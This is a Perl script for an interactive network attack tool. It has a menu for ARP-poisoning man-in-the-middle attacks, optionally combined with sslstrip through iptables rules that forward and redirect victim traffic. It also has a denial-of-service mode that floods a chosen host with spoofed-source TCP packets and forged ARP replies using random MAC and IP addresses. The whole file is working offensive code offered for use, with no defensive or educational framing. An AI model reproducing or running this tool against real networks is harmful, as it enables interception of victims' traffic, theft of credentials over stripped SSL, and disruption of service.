#!/usr/bin/perl -w
# -*- coding: utf-8 -*-
#sudo perl -MCPAN -e "CPAN::Shell->force(qw(install Net::ARP));"
use strict;
use warnings;
use Net::Ping;
use Time::HiRes;
use Term::ANSIColor qw(:constants);

if ($^O !~ m/linux/i) {
	
	if ($^O =~ m/MS(.*)/i) {
		eval {
			require Win32::Console::ANSI;
			import Win32::Console::ANSI qw(Cls Cursor Title XYMax SetConsoleSize);
		};
	    
		die BOLD RED "[" ,RESET,"!",BOLD RED,"]",RESET," Sorry; Linux Only\n";
	}
    
	else {
		die BOLD RED "[" ,RESET,"!",BOLD RED,"]",RESET," Sorry; Linux Only\n";
	}
}

else {
	use Net::ARP;
	use Net::RawIP;
	if ($> != 0 ) {
		die BOLD RED "[" ,RESET,"!",BOLD RED,"]",RESET," need root\n";
	}	
}

# defaults
my $iface = "";
my $host = "";
my $port = 80;
my $data = 0;
my $stop = 0;
my $resolucao;
my $duracao;
my $contador = 50;
my $size = '60000';
my $menu = '';
my $eval = "FALSE";
my $clear = 'reset';
my $status = 'disable';

do{

	`$clear`;
	print q{
	+-------------------+--------+--------------+
	|                  ARP-OPT                  |
	|                                           |
	+----+--------------------------------------+
	| 1 - MTIM/SSL -> Requires sslstrip por 1000|
	|                                           |
	| 2 - MTIM   -> no SSL Suport               |
	|                                           |
	| 3 - MultiProtocol Denial-of-service attack|
	|                                           |
	| 4 - exit -> Quits code                    |
	|                                           |
	|           nEtWork Exploition              |
	|                                           |
	+-------------------------------------------+
	};
    
	print "menu",GREEN," >>> ",RESET; our $menu =<STDIN>; chomp ($menu);
	
	if ($menu eq "1") {
		$eval = "TRUE";
		$status = 'Enabled';
		MTIMSSL($eval,$status);
	}
    
	elsif ($menu eq "2"){
		MTIMSSL($eval,$status);
	}
	
	elsif ($menu eq "3"){
		FDOS();
	}
  
} until (($menu =~ m/exit/i) or ($menu =~ m/5/i)),exit 0;

sub MTIMSSL {

        my ($eval,$status) = @_;
	print BOLD RED "[" ,RESET,"!",BOLD RED,"]",RESET," type",RED," return",RESET," to go back\n\n";	
	print BOLD RED, "[ ",RESET, "NOTE",BOLD RED" ]",RESET," if the automated process fails to retrieve the MAC Addr's \ntype the MAC Addr's in\n",RESET;
	print "\n";
	print BOLD GREEN "[" ,RESET,"+",BOLD GREEN,"]",RESET, " Interface to Use Ex: eth1 | wlan0 | eth0 \n";
	print "Interface",GREEN," >>> ",RESET; my $iface = <STDIN>;
	chomp ($iface);
        
	if ($iface=~ m/return/i) {
		return;
	}    
	
	my $mymac = Net::ARP::get_mac("$iface");
	
	if ($mymac =~ m/unknown/i){
		print BOLD GREEN "[" ,RESET,"+",BOLD GREEN,"]",RESET, "could not get Local MAC\n";
		die; 
	}
	
	#Lets Forward All the Junk shall we 
	system "iptables -P FORWARD ACCEPT";
	system "iptables --table nat -A POSTROUTING -o $iface -j MASQUERADE";
        
	if ($eval eq "TRUE") {
		#system "iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000";
		system "iptables -t nat -A PREROUTING -i $iface -p tcp --destination-port 443 -j REDIRECT --to-port 10000";
		print BOLD RED "[" ,RESET,"!",BOLD RED,"]",RESET," You Have chosed to Enable SSL -> port 10000 $iface $mymac\n";
	}
    
	else {
		print BOLD GREEN "\n[" ,RESET," INFO ",BOLD GREEN,"]",RESET, " SSL Not Enable\n";
		print BOLD GREEN ">>>",RESET," Using Devide -> $iface $mymac\n";
	}
	
	print RED "[" ,RESET,"!",RED,"]",RESET, " Insert Gateway IP \n" ;
	print GREEN ">>> ",RESET; my $gateway = <STDIN> ;
	chomp ($gateway);
	
	if ($gateway=~ m/return/i) {
		return;
	}  
        
	print RED "[" ,RESET,"!",RED,"]",RESET, " Insert Gateway MAC Address or type",RED, " auto ",RESET, "for automated process\n";
	print GREEN ">>> ",RESET; my $gatemac = <STDIN> ;
	chomp ($gatemac);
	
	unless (($gatemac =~ m/auto/i) or ($gatemac =~ m/return/i) || ($gatemac =~ m/exit/i)) {
	    
		print BOLD GREEN "[" ,RESET," Manual ",BOLD GREEN,"]",RESET," Provided MAC $gatemac\n";
		print BOLD GREEN "[" ,RESET,"!",BOLD GREEN,"]",RESET," is this correct?",BOLD RED," no",RESET," returns enter proceeds\n";
		
		print GREEN ">>> ",RESET; my $confirmation = <STDIN>;
		
		if (($confirmation =~ m/no/i) or ($confirmation =~ m/return/i)){
			return;	
		}
	}

	elsif ($gatemac=~ m/exit/i) {
		exit 0;
	} 
    
	elsif ($gatemac =~ m/auto/i) {
		
		my $p = Net::Ping->new("icmp");
		print BOLD GREEN "[" ,RESET," Scanning ",BOLD GREEN,"]",RESET," gateway $gateway, stand by\n";
		$p->ping($gateway, 2);
		$gatemac = Net::ARP::arp_lookup($iface,$gateway);
		print BOLD GREEN "[" ,RESET," Auto ",BOLD GREEN,"]",RESET," MAC $gatemac for $gateway\n";
            
		if ($gatemac =~ m/unknown/i ) {
			print BOLD GREEN "[" ,RESET,"+",BOLD GREEN,"]",RESET," Unknown Mac from $gateway -> try giving a valid Mac\n";
			die;
		}
		
		elsif ($gatemac =~ m/00:00:00:00:00:00/i){
			print BOLD RED "[" ,RESET,"+",BOLD RED,"]",RESET," Erroneouss mac retrieved $gatemac\n";
			die;
		}
	}
    
	print BOLD GREEN "[" ,RESET,"+",BOLD GREEN,"]",RESET, " Insert Target IP \n" ;
	print GREEN ">>> ",RESET; my $target = <STDIN> ;
	chomp ($target);
	
	if ($target=~ m/return/i) {
		return;
	}  
	
	elsif ($target=~ m/exit/i) {
		exit 0;
	}
        
	print BOLD RED "[" ,RESET,"!",BOLD RED,"]",RESET, " Insert Target MAC Address or type",RED, " auto ",RESET, "for automated process\n";
	print GREEN ">>> ",RESET; my $targetmac = <STDIN> ;
	chomp ($targetmac);
	    
	unless (($targetmac =~ m/auto/i) or ($targetmac =~ m/return/i) or ($targetmac =~ m/exit/i)) {
		
		print BOLD GREEN "[" ,RESET," Manual ",BOLD GREEN,"]",RESET, " $targetmac of $target\n";
		print BOLD RED "[" ,RESET,"!",BOLD RED,"]",RESET," is this correct?",BOLD RED," no",RESET," returns enter proceeds\n";
		print GREEN ">>> ",RESET; my $confirmation = <STDIN>;
		
		if ($confirmation =~ m/no/i) {
			return;	
		}
	}
        
	elsif ($targetmac=~ m/return/i) {
		return;
	} 
	
	elsif ($targetmac=~ m/exit/i) {
		exit 0;
	} 
    
	elsif ($targetmac =~ m/auto/i) {
        
		my $p = Net::Ping->new("icmp");
		print BOLD GREEN "[" ,RESET," Scanning ",BOLD GREEN,"]",RESET," target $target, stand by\n";
		$p->ping($target, 2);
		$targetmac = Net::ARP::arp_lookup($iface,$target);
		print BOLD GREEN "[" ,RESET," Auto ",BOLD GREEN,"]",RESET, " MAC $targetmac for $target\n";
		sleep 2;
		if ($targetmac =~ m/unknow/i ) {
			print BOLD RED "[" ,RESET,"+",BOLD RED,"]",RESET, " Unknown Mac from $gateway -> try giving a valid Mac\n";
			die;
		}
                
		elsif ($targetmac =~ m/00:00:00:00:00:00/i){
			print BOLD RED "[" ,RESET,"+",BOLD RED,"]",RESET," Erroneouss mac retrieved $targetmac\n";
			die;
	    }
	}
	poison($iface,$mymac,$gateway,$gatemac,$target,$targetmac,$status);    
}

sub poison {

	`$clear`;
	my ($iface,$mymac,$gateway,$gatemac,$target,$targetmac,$status) = @_;
	print GREEN "[+]",RESET," Poisoning ",BOLD YELLOW "[" ,RESET,"!",BOLD YELLOW,"]",RESET," SSL $status\n";
	print GREEN "[+]",RESET," $gateway $gatemac |MITM| $target $targetmac\n";
	print q{              
	GateWay               You  _                  Victim
	 _                    ___ |=|                    _
	|-|  __              |[_]||-|              __   |-|
	|=| [Ll]              )_(\|_|             [Ll]  |=|
	"^" ====`o           :::::O               ====`o"^"
	  |                     |                      |
	  |   Wire Interaction  |   Wire Interaction   |
      };
	print STDERR BOLD "\e[11;6H $gateway";
	print STDERR BOLD "\e[11;24H $mymac";
	print STDERR BOLD "\e[11;49H $target";
    
	while ("for ever") {
		
	    #Gateway operandi this is the, where we Tell the victim we are the gateway	
	    Net::ARP::send_packet($iface,
				    $gateway,                 
				    $target,                  
				    $mymac,                   
				    $targetmac,               
				    'reply');
	    
	    #Target operandi this is the, where we tell the gateway that we are the victim	
	    Net::ARP::send_packet($iface,                     
				    $target,                  
				    $gateway,                 
				    $mymac,                   
				    $gatemac,                 
				    'reply');
	    
	    print STDERR BOLD RED "\e[9;12H ___________________",RESET,"\e[12;1H";
	    Time::HiRes::sleep(0.20); #.20 seconds
	    print STDERR BOLD YELLOW "\e[9;12H ___________________",RESET,"\e[12;1H";
	    Time::HiRes::sleep(0.20); #.1 seconds
	    print STDERR BOLD GREEN "\e[9;12H ___________________",RESET,"\e[12;1H";
	    Time::HiRes::sleep(0.20); #.20 seconds
	    print STDERR BOLD "\e[9;12H ___________________",RESET,"\e[12;1H";
	    print STDERR BOLD RED "\e[9;34H ___________________",RESET,"\e[12;1H";
	    Time::HiRes::sleep(0.20); #.20 seconds
	    print STDERR BOLD YELLOW "\e[9;34H ___________________",RESET,"\e[12;1H";
	    Time::HiRes::sleep(0.20); #.20 seconds
	    print STDERR BOLD GREEN "\e[9;34H ___________________",RESET,"\e[12;1H";
	    Time::HiRes::sleep(0.20); #.20 seconds
	    print STDERR BOLD  "\e[9;34H ___________________",RESET,"\e[12;1H";
	}
}

sub FDOS {
	print "Interface",GREEN," >>> ",RESET; my $iface = <STDIN>;
	print "Target IP",GREEN," >>> ",RESET; my $host = <STDIN>;
	# Ip Evaluation through algorithm
	EvalIP($host);

	print "Target PORT",GREEN," >>> ",RESET; my $port = <STDIN>;
	# no ports over 65535
	if ($port > 65535) {
	    die BOLD RED "[" ,RESET,"!",BOLD RED,"]",RESET," Invalid PORT  <1-65535>\n";
	}
	
	print "Amount to send or default = 50",GREEN," >>> ",RESET; my $contador = <STDIN>;
	
	chomp ($iface,$host,$port,$contador);
	
	print BOLD GREEN "[" ,RESET," Scanning ",BOLD GREEN,"]",RESET," target $host, stand by\n";
	my ($resolucao,$duracao) = Ping ($host); # lets ping the host and cache its MAC ADDRS in our ARP cache
	
	# if we pingeg the host, 
	if ($resolucao == 1) {
	    print BOLD "\nHost -> $host esta [ ", BOLD GREEN,"ONLINE",RESET,BOLD," ] Reposta em [ ",GREEN,pack("A5",($duracao/1000)),RESET,BOLD" ] ms\n\n",RESET;
	}
	    
	# otherwise the host is off, still we might have its mac at our cache
	else {
	    print BOLD "Host-> $host esta [ ", BOLD RED,"OFFLINE",RESET,BOLD," ] Reposta em [ ",RED,"0000",RESET,BOLD" ] segundos\n",RESET;
	}
	
	# we define our targetmac through an ARP cache lookup, "arp -a"
	# if we pinged the host then its mac should be at our own arp cache, so we use i.
	my $targetmac = Net::ARP::arp_lookup($iface,$host);  
	print BOLD RED "[" ,RESET," Found MAC for $host ARP_ADDR $targetmac ",BOLD RED,"]\n",RESET unless (($targetmac eq "unknown" || $targetmac eq "00:00:00:00:00:00") && die);
	
	# present the info for 2 secs
	sleep 2;
	
	# clear the console for the rest of the code
	print `reset`;
	
	# until the stop reaches the amount of packets we defined lets bang bang the host
	while ($stop <= $contador) {
		
		# lets generate a mac addresses and associate some random ip's to those ADDR.
		my $spoofedmac = join ":", map int (rand(89)) + 10, 1 .. 6,; my $srcmac = pack("A16",$spoofedmac);
		my $spoofedip = join ".", map int rand 255, 1 .. 4; my $srcip = pack("A17",$spoofedip);
		$data = $data + $size;
		
		# pretty output :P
		print YELLOW "\e[2;2H############################################",RESET;
		print BOLD GREEN "\e[3;2H[" ,RESET,"!", BOLD GREEN,"]",RESET," $srcip  $srcmac",BOLD GREEN," [" ,RESET,"!", BOLD GREEN,"]",RESET,;
		print BOLD RED "\e[4;2H[" ,RESET,"!", BOLD RED,"]",RESET," Amount of data generated  $data";
		print YELLOW "\e[5;2H############################################",RESET;
		print "\e[7;1H\e[K\n";
		
		# TCP flood subroutine we parse the generated ip, there is no need to parse the host and port, just for the sake of it
		Flood($spoofedip,$srcip,$host,$port);
		
		# ARP Flood subroutine we parse the generated ip and associted generated mac, all the rest is for print purpose
		Arp($spoofedip,$spoofedmac,$srcip,$srcmac,$iface,$host,$targetmac);
		$stop++;
	}
}

sub Arp {
    
    my ($spoofedip,$spoofedmac,$srcip,$srcmac,$iface,$host,$targetmac) = @_; # process all the parsed $vars
    
    Net::ARP::send_packet($iface,
                        $spoofedip,                 
                        $host,                  
                        $spoofedmac,                   
                        $targetmac,               
                        'reply');
    
    print BOLD GREEN "[" ,RESET,">>>", BOLD GREEN,"]",RESET,BOLD," ARP LINK LAYER",RESET," Generated HOST $srcip ARP_ADDR $srcmac\n";
    print BOLD GREEN "[" ,RESET,">>>", BOLD GREEN,"]",RESET,BOLD," Target $host ARP_ADDR $targetmac ",BOLD GREEN," [" ,RESET,"<<<", BOLD GREEN,"]\n",RESET,;
}

sub Flood {
    
    my $flood = new Net::RawIP;
    my ($spoofedip,$srcip,$host,$port) = @_;
    my $sequencia = int(rand(2 ** 32) + 1); # generate a random sequence
    my $src_port = int(rand(65534)+1); # randomize our source port
    
    # we generate the packeth
    $flood = Net::RawIP->new({
        ip  => {
            saddr => $spoofedip,
            daddr => $host,
            },
        tcp => {
            source => $src_port,
            dest   => $port,
            seq => $sequencia,
            ack => 1, # ack, yes
            psh => 1, # push it , yes 
            window => 32792,
            data => 'fuck facebook', # just fuck facebook
            },
        });
    $flood->send; # send the TCP packeth
    print BOLD GREEN "[" ,RESET,"!", BOLD GREEN,"]",RESET,BOLD," TCP LAYER",RESET," Generated HOST $srcip -> Target $host ",BOLD GREEN," [" ,RESET,"!", BOLD GREEN,"]\n",RESET,;
}

sub Ping {
	my ($host) = @_;
	my $ping = Net::Ping->new("icmp"); # lets ping the host
	$ping->hires();
	($resolucao,$duracao) = $ping->ping($host);
}


sub EvalIP {
    
    my ($host) = @_;
    # if host not in an ip format we die, :O nooooooooo.
    if ($host !~ m/^(\d+)\.(\d+)\.(\d+)\.(\d+)$/) {
        die BOLD RED "[" ,RESET,"$host",BOLD RED,"]",RESET," >>> This is not an IP\n", Usage();
    }

    # otherwise
    elsif ($host =~ m/^(\d+)\.(\d+)\.(\d+)\.(\d+)$/) {
        
        # we check if all the octects are below 255.
        if ($1 <= 255 && $2 <= 255 && $3 <= 255 && $4 <= 255){
            # if so, great we return the $host to be used
            return $host;
        }
        
        # otherwise
        else {
            # we die, damn :/
            die BOLD RED "[" ,RESET,"$host",BOLD RED,"]",RESET," >>> Invalid IP\n", Usage();
        }
    }
}

